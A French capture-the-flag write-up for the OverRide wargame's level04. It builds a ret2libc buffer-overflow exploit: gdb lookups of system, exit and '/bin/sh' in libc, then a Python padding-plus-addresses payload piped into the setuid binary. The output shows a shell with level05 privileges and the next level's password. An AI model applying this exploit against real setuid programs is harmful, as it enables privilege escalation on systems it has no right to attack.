# Level04

Création du ret2libc, pour cela nous avons besoin de l'adresse de `system` d'`exit` et de `/bin/sh` dans la libc.
```
$ gdb ./level04
(gdb) b main
(gdb) r
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
...

(gdb) info function system                                                                                                                                    [17/354]
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb) info proc map
process 1996
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) quit
```
Ensuite on va composer notre payload : padding + system + exit + /bin/sh
```
level04@OverRide:~$ (python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"';cat) | ./level04
Give me some shellcode, k

id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat ~level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
